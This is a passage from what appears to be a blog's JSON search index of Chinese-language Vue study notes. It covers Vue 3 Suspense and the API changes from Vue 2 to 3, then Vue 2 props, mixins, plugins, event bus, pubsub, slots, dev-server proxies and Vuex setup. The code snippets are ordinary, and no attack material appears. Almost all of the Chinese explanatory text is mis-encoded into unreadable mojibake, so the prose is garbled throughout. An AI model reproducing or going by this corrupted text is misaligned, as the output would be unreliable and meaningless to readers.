{defineAsyncComponent} from 'vue' const Child = defineAsyncComponent(()=&gt;import('./components/Child.vue')) ä½¿ç”¨SuspenseåŒ…è£¹ç»„ä»¶ï¼Œå¹¶é…ç½®å¥½default ä¸ fallback &lt;template&gt; &lt;div class=\"app\"&gt; &lt;h3&gt;æˆ‘æ˜¯Appç»„ä»¶&lt;/h3&gt; &lt;Suspense&gt; &lt;template v-slot:default&gt; &lt;Child/&gt; &lt;/template&gt; &lt;template v-slot:fallback&gt; &lt;h3&gt;åŠ è½½ä¸­.....&lt;/h3&gt; &lt;/template&gt; &lt;/Suspense&gt; &lt;/div&gt; &lt;/template&gt; å…¶ä»–1.å…¨å±€APIçš„è½¬ç§» Vue 2.x æœ‰è®¸å¤šå…¨å±€ API å’Œé…ç½®ã€‚ ä¾‹å¦‚ï¼šæ³¨å†Œå…¨å±€ç»„ä»¶ã€æ³¨å†Œå…¨å±€æŒ‡ä»¤ç­‰ã€‚ //æ³¨å†Œå…¨å±€ç»„ä»¶ Vue.component('MyButton', { data: () =&gt; ({ count: 0 }), template: '&lt;button @click=\"count++\"&gt;Clicked {{ count }} times.&lt;/button&gt;' }) //æ³¨å†Œå…¨å±€æŒ‡ä»¤ Vue.directive('focus', { inserted: el =&gt; el.focus() } Vue3.0ä¸­å¯¹è¿™äº›APIåšå‡ºäº†è°ƒæ•´ï¼š å°†å…¨å±€çš„APIï¼Œå³ï¼šVue.xxxè°ƒæ•´åˆ°åº”ç”¨å®ä¾‹ï¼ˆappï¼‰ä¸Š 2.x å…¨å±€ APIï¼ˆVueï¼‰ 3.x å®ä¾‹ API (app) Vue.config.xxxx app.config.xxxx Vue.config.productionTip ç§»é™¤ Vue.component app.component Vue.directive app.directive Vue.mixin app.mixin Vue.use app.use Vue.prototype app.config.globalProperties 2.å…¶ä»–æ”¹å˜ dataé€‰é¡¹åº”å§‹ç»ˆè¢«å£°æ˜ä¸ºä¸€ä¸ªå‡½æ•°ã€‚ è¿‡åº¦ç±»åçš„æ›´æ”¹ï¼š Vue2.xå†™æ³• .v-enter, .v-leave-to { opacity: 0; } .v-leave, .v-enter-to { opacity: 1; } Vue3.xå†™æ³• .v-enter-from, .v-leave-to { opacity: 0; } .v-leave-from, .v-enter-to { opacity: 1; } ç§»é™¤keyCodeä½œä¸º v-on çš„ä¿®é¥°ç¬¦ï¼ŒåŒæ—¶ä¹Ÿä¸å†æ”¯æŒconfig.keyCodes ç§»é™¤v-on.nativeä¿®é¥°ç¬¦ çˆ¶ç»„ä»¶ä¸­ç»‘å®šäº‹ä»¶ &lt;my-component v-on:close=\"handleComponentEvent\" v-on:click=\"handleNativeClickEvent\" /&gt; å­ç»„ä»¶ä¸­å£°æ˜è‡ªå®šä¹‰äº‹ä»¶ &lt;script&gt; export default { emits: ['close'] } &lt;/script&gt; ç§»é™¤è¿‡æ»¤å™¨ï¼ˆfilterï¼‰ è¿‡æ»¤å™¨è™½ç„¶è¿™çœ‹èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œä½†å®ƒéœ€è¦ä¸€ä¸ªè‡ªå®šä¹‰è¯­æ³•ï¼Œæ‰“ç ´å¤§æ‹¬å·å†…è¡¨è¾¾å¼æ˜¯ â€œåªæ˜¯ JavaScriptâ€ çš„å‡è®¾ï¼Œè¿™ä¸ä»…æœ‰å­¦ä¹ æˆæœ¬ï¼Œè€Œä¸”æœ‰å®ç°æˆæœ¬ï¼å»ºè®®ç”¨æ–¹æ³•è°ƒç”¨æˆ–è®¡ç®—å±æ€§å»æ›¿æ¢è¿‡æ»¤å™¨ã€‚ â€¦â€¦","categories":[{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/categories/Vue/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/tags/Vue/"}]},{"title":"Vue2è¿›é˜¶çŸ¥è¯†","slug":"03-Vue2è¿›é˜¶çŸ¥è¯†","date":"2022-03-14T04:00:00.000Z","updated":"2022-03-25T07:58:50.122Z","comments":true,"path":"posts/3.html","link":"","permalink":"https://serein.icu/posts/3.html","excerpt":"","text":"è¿›é˜¶çŸ¥è¯†ç¯‡è„šæ‰‹æ¶æ–‡ä»¶ç»“æ„ â”œâ”€â”€ node_modules â”œâ”€â”€ public â”‚ â”œâ”€â”€ favicon.ico: é¡µç­¾å›¾æ ‡ â”‚ â””â”€â”€ index.html: ä¸»é¡µé¢ â”œâ”€â”€ src â”‚ â”œâ”€â”€ assets: å­˜æ”¾é™æ€èµ„æº â”‚ â”‚ â””â”€â”€ logo.png â”‚ â”‚â”€â”€ component: å­˜æ”¾ç»„ä»¶ â”‚ â”‚ â””â”€â”€ HelloWorld.vue â”‚ â”‚â”€â”€ App.vue: æ±‡æ€»æ‰€æœ‰ç»„ä»¶ â”‚ â”‚â”€â”€ main.js: å…¥å£æ–‡ä»¶ â”œâ”€â”€ .gitignore: gitç‰ˆæœ¬ç®¡åˆ¶å¿½ç•¥çš„é…ç½® â”œâ”€â”€ babel.config.js: babelçš„é…ç½®æ–‡ä»¶ â”œâ”€â”€ package.json: åº”ç”¨åŒ…é…ç½®æ–‡ä»¶ â”œâ”€â”€ README.md: åº”ç”¨æè¿°æ–‡ä»¶ â”œâ”€â”€ package-lock.jsonï¼šåŒ…ç‰ˆæœ¬æ§åˆ¶æ–‡ä»¶ å…³äºä¸åŒç‰ˆæœ¬çš„Vue vue.jsä¸vue.runtime.xxx.jsçš„åŒºåˆ«ï¼š vue.jsæ˜¯å®Œæ•´ç‰ˆçš„Vueï¼ŒåŒ…å«ï¼šæ ¸å¿ƒåŠŸèƒ½ + æ¨¡æ¿è§£æå™¨ã€‚ vue.runtime.xxx.jsæ˜¯è¿è¡Œç‰ˆçš„Vueï¼ŒåªåŒ…å«ï¼šæ ¸å¿ƒåŠŸèƒ½ï¼›æ²¡æœ‰æ¨¡æ¿è§£æå™¨ã€‚ å› ä¸ºvue.runtime.xxx.jsæ²¡æœ‰æ¨¡æ¿è§£æå™¨ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨templateè¿™ä¸ªé…ç½®é¡¹ï¼Œéœ€è¦ä½¿ç”¨renderå‡½æ•°æ¥æ”¶åˆ°çš„createElementå‡½æ•°å»æŒ‡å®šå…·ä½“å†…å®¹ã€‚ vue.config.jsé…ç½®æ–‡ä»¶ ä½¿ç”¨vue inspect &gt; output.jså¯ä»¥æŸ¥çœ‹åˆ°Vueè„šæ‰‹æ¶çš„é»˜è®¤é…ç½®ã€‚ ä½¿ç”¨vue.config.jså¯ä»¥å¯¹è„šæ‰‹æ¶è¿›è¡Œä¸ªæ€§åŒ–å®šåˆ¶ï¼Œè¯¦æƒ…è§ï¼šhttps://cli.vuejs.org/zh refå±æ€§ è¢«ç”¨æ¥ç»™å…ƒç´ æˆ–å­ç»„ä»¶æ³¨å†Œå¼•ç”¨ä¿¡æ¯ï¼ˆidçš„æ›¿ä»£è€…ï¼‰ åº”ç”¨åœ¨htmlæ ‡ç­¾ä¸Šè·å–çš„æ˜¯çœŸå®DOMå…ƒç´ ï¼Œåº”ç”¨åœ¨ç»„ä»¶æ ‡ç­¾ä¸Šæ˜¯ç»„ä»¶å®ä¾‹å¯¹è±¡ï¼ˆvcï¼‰ ä½¿ç”¨æ–¹å¼ï¼š æ‰“æ ‡è¯†ï¼š&lt;h1 ref=\"xxx\"&gt;.....&lt;/h1&gt; æˆ– &lt;School ref=\"xxx\"&gt;&lt;/School&gt; è·å–ï¼šthis.$refs.xxx propsé…ç½®é¡¹ åŠŸèƒ½ï¼šè®©ç»„ä»¶æ¥æ”¶å¤–éƒ¨ä¼ è¿‡æ¥çš„æ•°æ® ä¼ é€’æ•°æ®ï¼š&lt;Demo name=\"xxx\"/&gt; æ¥æ”¶æ•°æ®ï¼š ç¬¬ä¸€ç§æ–¹å¼ï¼ˆåªæ¥æ”¶ï¼‰ï¼šprops:['name'] ç¬¬äºŒç§æ–¹å¼ï¼ˆé™åˆ¶ç±»å‹ï¼‰ï¼šprops:{name:String} ç¬¬ä¸‰ç§æ–¹å¼ï¼ˆé™åˆ¶ç±»å‹ã€é™åˆ¶å¿…è¦æ€§ã€æŒ‡å®šé»˜è®¤å€¼ï¼‰ï¼š props:{ name:{ type:String, //ç±»å‹ required:true, //å¿…è¦æ€§ default:'è€ç‹' //é»˜è®¤å€¼ } } å¤‡æ³¨ï¼špropsæ˜¯åªè¯»çš„ï¼ŒVueåº•å±‚ä¼šç›‘æµ‹ä½ å¯¹propsçš„ä¿®æ”¹ï¼Œå¦‚æœè¿›è¡Œäº†ä¿®æ”¹ï¼Œå°±ä¼šå‘å‡ºè­¦å‘Šï¼Œè‹¥ä¸šåŠ¡éœ€æ±‚ç¡®å®éœ€è¦ä¿®æ”¹ï¼Œé‚£ä¹ˆè¯·å¤åˆ¶propsçš„å†…å®¹åˆ°dataä¸­ä¸€ä»½ï¼Œç„¶åå»ä¿®æ”¹dataä¸­çš„æ•°æ®ã€‚ mixin(æ··å…¥) åŠŸèƒ½ï¼šå¯ä»¥æŠŠå¤šä¸ªç»„ä»¶å…±ç”¨çš„é…ç½®æå–æˆä¸€ä¸ªæ··å…¥å¯¹è±¡ ä½¿ç”¨æ–¹å¼ï¼š ç¬¬ä¸€æ­¥å®šä¹‰æ··åˆï¼š { data(){....}, methods:{....} .... } ç¬¬äºŒæ­¥ä½¿ç”¨æ··å…¥ï¼š â€‹ å…¨å±€æ··å…¥ï¼šVue.mixin(xxx) â€‹ å±€éƒ¨æ··å…¥ï¼šmixins:['xxx'] æ’ä»¶ åŠŸèƒ½ï¼šç”¨äºå¢å¼ºVue æœ¬è´¨ï¼šåŒ…å«installæ–¹æ³•çš„ä¸€ä¸ªå¯¹è±¡ï¼Œinstallçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Vueï¼Œç¬¬äºŒä¸ªä»¥åçš„å‚æ•°æ˜¯æ’ä»¶ä½¿ç”¨è€…ä¼ é€’çš„æ•°æ®ã€‚ å®šä¹‰æ’ä»¶ï¼š å¯¹è±¡.install = function (Vue, options) { // 1. æ·»åŠ å…¨å±€è¿‡æ»¤å™¨ Vue.filter(....) // 2. æ·»åŠ å…¨å±€æŒ‡ä»¤ Vue.directive(....) // 3. é…ç½®å…¨å±€æ··å…¥(åˆ) Vue.mixin(....) // 4. æ·»åŠ å®ä¾‹æ–¹æ³• Vue.prototype.$myMethod = function () {...} Vue.prototype.$myProperty = xxxx } ä½¿ç”¨æ’ä»¶ï¼šVue.use() scopedæ ·å¼ ä½œç”¨ï¼šè®©æ ·å¼åœ¨å±€éƒ¨ç”Ÿæ•ˆï¼Œé˜²æ­¢å†²çªã€‚ å†™æ³•ï¼š&lt;style scoped&gt; æ€»ç»“TodoListæ¡ˆä¾‹ ç»„ä»¶åŒ–ç¼–ç æµç¨‹ï¼š â€‹ (1).æ‹†åˆ†é™æ€ç»„ä»¶ï¼šç»„ä»¶è¦æŒ‰ç…§åŠŸèƒ½ç‚¹æ‹†åˆ†ï¼Œå‘½åä¸è¦ä¸htmlå…ƒç´ å†²çªã€‚ â€‹ (2).å®ç°åŠ¨æ€ç»„ä»¶ï¼šè€ƒè™‘å¥½æ•°æ®çš„å­˜æ”¾ä½ç½®ï¼Œæ•°æ®æ˜¯ä¸€ä¸ªç»„ä»¶åœ¨ç”¨ï¼Œè¿˜æ˜¯ä¸€äº›ç»„ä»¶åœ¨ç”¨ï¼š â€‹ 1).ä¸€ä¸ªç»„ä»¶åœ¨ç”¨ï¼šæ”¾åœ¨ç»„ä»¶è‡ªèº«å³å¯ã€‚ â€‹ 2). ä¸€äº›ç»„ä»¶åœ¨ç”¨ï¼šæ”¾åœ¨ä»–ä»¬å…±åŒçš„çˆ¶ç»„ä»¶ä¸Šï¼ˆçŠ¶æ€æå‡ï¼‰ã€‚ â€‹ (3).å®ç°äº¤äº’ï¼šä»ç»‘å®šäº‹ä»¶å¼€å§‹ã€‚ propsé€‚ç”¨äºï¼š â€‹ (1).çˆ¶ç»„ä»¶ ==&gt; å­ç»„ä»¶ é€šä¿¡ â€‹ (2).å­ç»„ä»¶ ==&gt; çˆ¶ç»„ä»¶ é€šä¿¡ï¼ˆè¦æ±‚çˆ¶å…ˆç»™å­ä¸€ä¸ªå‡½æ•°ï¼‰ ä½¿ç”¨v-modelæ—¶è¦åˆ‡è®°ï¼šv-modelç»‘å®šçš„å€¼ä¸èƒ½æ˜¯propsä¼ è¿‡æ¥çš„å€¼ï¼Œå› ä¸ºpropsæ˜¯ä¸å¯ä»¥ä¿®æ”¹çš„ï¼ propsä¼ è¿‡æ¥çš„è‹¥æ˜¯å¯¹è±¡ç±»å‹çš„å€¼ï¼Œä¿®æ”¹å¯¹è±¡ä¸­çš„å±æ€§æ—¶Vueä¸ä¼šæŠ¥é”™ï¼Œä½†ä¸æ¨èè¿™æ ·åšã€‚ webStorage å­˜å‚¨å†…å®¹å¤§å°ä¸€èˆ¬æ”¯æŒ5MBå·¦å³ï¼ˆä¸åŒæµè§ˆå™¨å¯èƒ½è¿˜ä¸ä¸€æ ·ï¼‰ æµè§ˆå™¨ç«¯é€šè¿‡ Window.sessionStorage å’Œ Window.localStorage å±æ€§æ¥å®ç°æœ¬åœ°å­˜å‚¨æœºåˆ¶ã€‚ ç›¸å…³APIï¼š xxxxxStorage.setItem('key', 'value'); è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªé”®å’Œå€¼ä½œä¸ºå‚æ•°ï¼Œä¼šæŠŠé”®å€¼å¯¹æ·»åŠ åˆ°å­˜å‚¨ä¸­ï¼Œå¦‚æœé”®åå­˜åœ¨ï¼Œåˆ™æ›´æ–°å…¶å¯¹åº”çš„å€¼ã€‚ xxxxxStorage.getItem('person'); â€‹ è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªé”®åä½œä¸ºå‚æ•°ï¼Œè¿”å›é”®åå¯¹åº”çš„å€¼ã€‚ xxxxxStorage.removeItem('key'); â€‹ è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªé”®åä½œä¸ºå‚æ•°ï¼Œå¹¶æŠŠè¯¥é”®åä»å­˜å‚¨ä¸­åˆ é™¤ã€‚ xxxxxStorage.clear() â€‹ è¯¥æ–¹æ³•ä¼šæ¸…ç©ºå­˜å‚¨ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚ å¤‡æ³¨ï¼š SessionStorageå­˜å‚¨çš„å†…å®¹ä¼šéšç€æµè§ˆå™¨çª—å£å…³é—­è€Œæ¶ˆå¤±ã€‚ LocalStorageå­˜å‚¨çš„å†…å®¹ï¼Œéœ€è¦æ‰‹åŠ¨æ¸…é™¤æ‰ä¼šæ¶ˆå¤±ã€‚ xxxxxStorage.getItem(xxx)å¦‚æœxxxå¯¹åº”çš„valueè·å–ä¸åˆ°ï¼Œé‚£ä¹ˆgetItemçš„è¿”å›å€¼æ˜¯nullã€‚ JSON.parse(null)çš„ç»“æœä¾ç„¶æ˜¯nullã€‚ ç»„ä»¶çš„è‡ªå®šä¹‰äº‹ä»¶ ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œé€‚ç”¨äºï¼šå­ç»„ä»¶ ===&gt; çˆ¶ç»„ä»¶ ä½¿ç”¨åœºæ™¯ï¼šAæ˜¯çˆ¶ç»„ä»¶ï¼ŒBæ˜¯å­ç»„ä»¶ï¼ŒBæƒ³ç»™Aä¼ æ•°æ®ï¼Œé‚£ä¹ˆå°±è¦åœ¨Aä¸­ç»™Bç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼ˆäº‹ä»¶çš„å›è°ƒåœ¨Aä¸­ï¼‰ã€‚ ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼š ç¬¬ä¸€ç§æ–¹å¼ï¼Œåœ¨çˆ¶ç»„ä»¶ä¸­ï¼š&lt;Demo @atguigu=\"test\"/&gt; æˆ– &lt;Demo v-on:atguigu=\"test\"/&gt; ç¬¬äºŒç§æ–¹å¼ï¼Œåœ¨çˆ¶ç»„ä»¶ä¸­ï¼š &lt;Demo ref=\"demo\"/&gt; ...... mounted(){ this.$refs.xxx.$on('atguigu',this.test) } è‹¥æƒ³è®©è‡ªå®šä¹‰äº‹ä»¶åªèƒ½è§¦å‘ä¸€æ¬¡ï¼Œå¯ä»¥ä½¿ç”¨onceä¿®é¥°ç¬¦ï¼Œæˆ–$onceæ–¹æ³•ã€‚ è§¦å‘è‡ªå®šä¹‰äº‹ä»¶ï¼šthis.$emit('atguigu',æ•°æ®) è§£ç»‘è‡ªå®šä¹‰äº‹ä»¶this.$off('atguigu') ç»„ä»¶ä¸Šä¹Ÿå¯ä»¥ç»‘å®šåŸç”ŸDOMäº‹ä»¶ï¼Œéœ€è¦ä½¿ç”¨nativeä¿®é¥°ç¬¦ã€‚ æ³¨æ„ï¼šé€šè¿‡this.$refs.xxx.$on('atguigu',å›è°ƒ)ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶æ—¶ï¼Œå›è°ƒè¦ä¹ˆé…ç½®åœ¨methodsä¸­ï¼Œè¦ä¹ˆç”¨ç®­å¤´å‡½æ•°ï¼Œå¦åˆ™thisæŒ‡å‘ä¼šå‡ºé—®é¢˜ï¼ å…¨å±€äº‹ä»¶æ€»çº¿ï¼ˆGlobalEventBusï¼‰ ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œé€‚ç”¨äºä»»æ„ç»„ä»¶é—´é€šä¿¡ã€‚ å®‰è£…å…¨å±€äº‹ä»¶æ€»çº¿ï¼š new Vue({ ...... beforeCreate() { Vue.prototype.$bus = this //å®‰è£…å…¨å±€äº‹ä»¶æ€»çº¿ï¼Œ$buså°±æ˜¯å½“å‰åº”ç”¨çš„vm }, ...... }) ä½¿ç”¨äº‹ä»¶æ€»çº¿ï¼š æ¥æ”¶æ•°æ®ï¼šAç»„ä»¶æƒ³æ¥æ”¶æ•°æ®ï¼Œåˆ™åœ¨Aç»„ä»¶ä¸­ç»™$busç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼Œäº‹ä»¶çš„å›è°ƒç•™åœ¨Aç»„ä»¶è‡ªèº«ã€‚ methods(){ demo(data){......} } ...... mounted() { this.$bus.$on('xxxx',this.demo) } æä¾›æ•°æ®ï¼šthis.$bus.$emit('xxxx',æ•°æ®) æœ€å¥½åœ¨beforeDestroyé’©å­ä¸­ï¼Œç”¨$offå»è§£ç»‘å½“å‰ç»„ä»¶æ‰€ç”¨åˆ°çš„äº‹ä»¶ã€‚ æ¶ˆæ¯è®¢é˜…ä¸å‘å¸ƒï¼ˆpubsubï¼‰ ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œé€‚ç”¨äºä»»æ„ç»„ä»¶é—´é€šä¿¡ã€‚ ä½¿ç”¨æ­¥éª¤ï¼š å®‰è£…pubsubï¼šnpm i pubsub-js å¼•å…¥: import pubsub from 'pubsub-js' æ¥æ”¶æ•°æ®ï¼šAç»„ä»¶æƒ³æ¥æ”¶æ•°æ®ï¼Œåˆ™åœ¨Aç»„ä»¶ä¸­è®¢é˜…æ¶ˆæ¯ï¼Œè®¢é˜…çš„å›è°ƒç•™åœ¨Aç»„ä»¶è‡ªèº«ã€‚ methods(){ demo(data){......} } ...... mounted() { this.pid = pubsub.subscribe('xxx',this.demo) //è®¢é˜…æ¶ˆæ¯ } æä¾›æ•°æ®ï¼špubsub.publish('xxx',æ•°æ®) æœ€å¥½åœ¨beforeDestroyé’©å­ä¸­ï¼Œç”¨PubSub.unsubscribe(pid)å»å–æ¶ˆè®¢é˜…ã€‚ nextTick è¯­æ³•ï¼šthis.$nextTick(å›è°ƒå‡½æ•°) ä½œç”¨ï¼šåœ¨ä¸‹ä¸€æ¬¡ DOM æ›´æ–°ç»“æŸåæ‰§è¡Œå…¶æŒ‡å®šçš„å›è°ƒã€‚ ä»€ä¹ˆæ—¶å€™ç”¨ï¼šå½“æ”¹å˜æ•°æ®åï¼Œè¦åŸºäºæ›´æ–°åçš„æ–°DOMè¿›è¡ŒæŸäº›æ“ä½œæ—¶ï¼Œè¦åœ¨nextTickæ‰€æŒ‡å®šçš„å›è°ƒå‡½æ•°ä¸­æ‰§è¡Œã€‚ Vueå°è£…çš„è¿‡åº¦ä¸åŠ¨ç”» ä½œç”¨ï¼šåœ¨æ’å…¥ã€æ›´æ–°æˆ–ç§»é™¤ DOMå…ƒç´ æ—¶ï¼Œåœ¨åˆé€‚çš„æ—¶å€™ç»™å…ƒç´ æ·»åŠ æ ·å¼ç±»åã€‚ å›¾ç¤ºï¼š å†™æ³•ï¼š å‡†å¤‡å¥½æ ·å¼ï¼š å…ƒç´ è¿›å…¥çš„æ ·å¼ï¼š v-enterï¼šè¿›å…¥çš„èµ·ç‚¹ v-enter-activeï¼šè¿›å…¥è¿‡ç¨‹ä¸­ v-enter-toï¼šè¿›å…¥çš„ç»ˆç‚¹ å…ƒç´ ç¦»å¼€çš„æ ·å¼ï¼š v-leaveï¼šç¦»å¼€çš„èµ·ç‚¹ v-leave-activeï¼šç¦»å¼€è¿‡ç¨‹ä¸­ v-leave-toï¼šç¦»å¼€çš„ç»ˆç‚¹ ä½¿ç”¨&lt;transition&gt;åŒ…è£¹è¦è¿‡åº¦çš„å…ƒç´ ï¼Œå¹¶é…ç½®nameå±æ€§ï¼š &lt;transition name=\"hello\"&gt; &lt;h1 v-show=\"isShow\"&gt;ä½ å¥½å•Šï¼&lt;/h1&gt; &lt;/transition&gt; å¤‡æ³¨ï¼šè‹¥æœ‰å¤šä¸ªå…ƒç´ éœ€è¦è¿‡åº¦ï¼Œåˆ™éœ€è¦ä½¿ç”¨ï¼š&lt;transition-group&gt;ï¼Œä¸”æ¯ä¸ªå…ƒç´ éƒ½è¦æŒ‡å®škeyå€¼ã€‚ vueè„šæ‰‹æ¶é…ç½®ä»£ç†æ–¹æ³•ä¸€â€‹ åœ¨vue.config.jsä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š devServer:{ proxy:\"http://localhost:5000\" } è¯´æ˜ï¼š ä¼˜ç‚¹ï¼šé…ç½®ç®€å•ï¼Œè¯·æ±‚èµ„æºæ—¶ç›´æ¥å‘ç»™å‰ç«¯ï¼ˆ8080ï¼‰å³å¯ã€‚ ç¼ºç‚¹ï¼šä¸èƒ½é…ç½®å¤šä¸ªä»£ç†ï¼Œä¸èƒ½çµæ´»çš„æ§åˆ¶è¯·æ±‚æ˜¯å¦èµ°ä»£ç†ã€‚ å·¥ä½œæ–¹å¼ï¼šè‹¥æŒ‰ç…§ä¸Šè¿°é…ç½®ä»£ç†ï¼Œå½“è¯·æ±‚äº†å‰ç«¯ä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œé‚£ä¹ˆè¯¥è¯·æ±‚ä¼šè½¬å‘ç»™æœåŠ¡å™¨ ï¼ˆä¼˜å…ˆåŒ¹é…å‰ç«¯èµ„æºï¼‰ æ–¹æ³•äºŒâ€‹ ç¼–å†™vue.config.jsé…ç½®å…·ä½“ä»£ç†è§„åˆ™ï¼š module.exports = { devServer: { proxy: { '/api1': {// åŒ¹é…æ‰€æœ‰ä»¥ '/api1'å¼€å¤´çš„è¯·æ±‚è·¯å¾„ target: 'http://localhost:5000',// ä»£ç†ç›®æ ‡çš„åŸºç¡€è·¯å¾„ changeOrigin: true, pathRewrite: {'^/api1': ''} }, '/api2': {// åŒ¹é…æ‰€æœ‰ä»¥ '/api2'å¼€å¤´çš„è¯·æ±‚è·¯å¾„ target: 'http://localhost:5001',// ä»£ç†ç›®æ ‡çš„åŸºç¡€è·¯å¾„ changeOrigin: true, pathRewrite: {'^/api2': ''} } } } } /* changeOriginè®¾ç½®ä¸ºtrueæ—¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚å¤´ä¸­çš„hostä¸ºï¼šlocalhost:5000 changeOriginè®¾ç½®ä¸ºfalseæ—¶ï¼ŒæœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚å¤´ä¸­çš„hostä¸ºï¼šlocalhost:8080 changeOriginé»˜è®¤å€¼ä¸ºtrue */ è¯´æ˜ï¼š ä¼˜ç‚¹ï¼šå¯ä»¥é…ç½®å¤šä¸ªä»£ç†ï¼Œä¸”å¯ä»¥çµæ´»çš„æ§åˆ¶è¯·æ±‚æ˜¯å¦èµ°ä»£ç†ã€‚ ç¼ºç‚¹ï¼šé…ç½®ç•¥å¾®ç¹çï¼Œè¯·æ±‚èµ„æºæ—¶å¿…é¡»åŠ å‰ç¼€ã€‚ æ’æ§½ ä½œç”¨ï¼šè®©çˆ¶ç»„ä»¶å¯ä»¥å‘å­ç»„ä»¶æŒ‡å®šä½ç½®æ’å…¥htmlç»“æ„ï¼Œä¹Ÿæ˜¯ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œé€‚ç”¨äº çˆ¶ç»„ä»¶ ===&gt; å­ç»„ä»¶ ã€‚ åˆ†ç±»ï¼šé»˜è®¤æ’æ§½ã€å…·åæ’æ§½ã€ä½œç”¨åŸŸæ’æ§½ ä½¿ç”¨æ–¹å¼ï¼š é»˜è®¤æ’æ§½ï¼š çˆ¶ç»„ä»¶ä¸­ï¼š &lt;Category&gt; &lt;div&gt;htmlç»“æ„1&lt;/div&gt; &lt;/Category&gt; å­ç»„ä»¶ä¸­ï¼š &lt;template&gt; &lt;div&gt; &lt;!-- å®šä¹‰æ’æ§½ --&gt; &lt;slot&gt;æ’æ§½é»˜è®¤å†…å®¹...&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; å…·åæ’æ§½ï¼š çˆ¶ç»„ä»¶ä¸­ï¼š &lt;Category&gt; &lt;template slot=\"center\"&gt; &lt;div&gt;htmlç»“æ„1&lt;/div&gt; &lt;/template&gt; &lt;template v-slot:footer&gt; &lt;div&gt;htmlç»“æ„2&lt;/div&gt; &lt;/template&gt; &lt;/Category&gt; å­ç»„ä»¶ä¸­ï¼š &lt;template&gt; &lt;div&gt; &lt;!-- å®šä¹‰æ’æ§½ --&gt; &lt;slot name=\"center\"&gt;æ’æ§½é»˜è®¤å†…å®¹...&lt;/slot&gt; &lt;slot name=\"footer\"&gt;æ’æ§½é»˜è®¤å†…å®¹...&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; ä½œç”¨åŸŸæ’æ§½ï¼š ç†è§£ï¼šæ•°æ®åœ¨ç»„ä»¶çš„è‡ªèº«ï¼Œä½†æ ¹æ®æ•°æ®ç”Ÿæˆçš„ç»“æ„éœ€è¦ç»„ä»¶çš„ä½¿ç”¨è€…æ¥å†³å®šã€‚ï¼ˆgamesæ•°æ®åœ¨Categoryç»„ä»¶ä¸­ï¼Œä½†ä½¿ç”¨æ•°æ®æ‰€éå†å‡ºæ¥çš„ç»“æ„ç”±Appç»„ä»¶å†³å®šï¼‰ å…·ä½“ç¼–ç ï¼š çˆ¶ç»„ä»¶ä¸­ï¼š &lt;Category&gt; &lt;template scope=\"scopeData\"&gt; &lt;!-- ç”Ÿæˆçš„æ˜¯ulåˆ—è¡¨ --&gt; &lt;ul&gt; &lt;li v-for=\"g in scopeData.games\" :key=\"g\"&gt;{{g}}&lt;/li&gt; &lt;/ul&gt; &lt;/template&gt; &lt;/Category&gt; &lt;Category&gt; &lt;template slot-scope=\"scopeData\"&gt; &lt;!-- ç”Ÿæˆçš„æ˜¯h4æ ‡é¢˜ --&gt; &lt;h4 v-for=\"g in scopeData.games\" :key=\"g\"&gt;{{g}}&lt;/h4&gt; &lt;/template&gt; &lt;/Category&gt; å­ç»„ä»¶ä¸­ï¼š &lt;template&gt; &lt;div&gt; &lt;slot :games=\"games\"&gt;&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name:'Category', props:['title'], //æ•°æ®åœ¨å­ç»„ä»¶è‡ªèº« data() { return { games:['çº¢è‰²è­¦æˆ’','ç©¿è¶Šç«çº¿','åŠ²èˆå›¢','è¶…çº§ç›ä¸½'] } }, } &lt;/script&gt; Vuex1.æ¦‚å¿µâ€‹ åœ¨Vueä¸­å®ç°é›†ä¸­å¼çŠ¶æ€ï¼ˆæ•°æ®ï¼‰ç®¡ç†çš„ä¸€ä¸ªVueæ’ä»¶ï¼Œå¯¹vueåº”ç”¨ä¸­å¤šä¸ªç»„ä»¶çš„å…±äº«çŠ¶æ€è¿›è¡Œé›†ä¸­å¼çš„ç®¡ç†ï¼ˆè¯»/å†™ï¼‰ï¼Œä¹Ÿæ˜¯ä¸€ç§ç»„ä»¶é—´é€šä¿¡çš„æ–¹å¼ï¼Œä¸”é€‚ç”¨äºä»»æ„ç»„ä»¶é—´é€šä¿¡ã€‚ 2.ä½•æ—¶ä½¿ç”¨ï¼Ÿâ€‹ å¤šä¸ªç»„ä»¶éœ€è¦å…±äº«æ•°æ®æ—¶ 3.æ­å»ºvuexç¯å¢ƒ åˆ›å»ºæ–‡ä»¶ï¼šsrc/store/index.js //å¼•å…¥Vueæ ¸å¿ƒåº“ import Vue from 'vue' //å¼•å…¥Vuex import Vuex from 'vuex' //åº”ç”¨Vuexæ’ä»¶ Vue.use(Vuex) //å‡†å¤‡actionså¯¹è±¡â€”â€”å“åº”ç»„ä»¶ä¸­ç”¨æˆ·çš„åŠ¨ä½œ const actions = {} //å‡†å¤‡mutationså¯¹è±¡â€”â€”ä¿®æ”¹stateä¸­çš„æ•°æ® const mutations = {} //å‡†å¤‡stateå¯¹è±¡â€”â€”ä¿å­˜å…·ä½“çš„æ•°æ® const state = {} //åˆ›å»ºå¹¶æš´éœ²store export default new Vuex.Store({ actions, mutations, state }) åœ¨main.jsä¸­åˆ›å»ºvmæ—¶ä¼ å…¥storeé…ç½®é¡¹ ...... 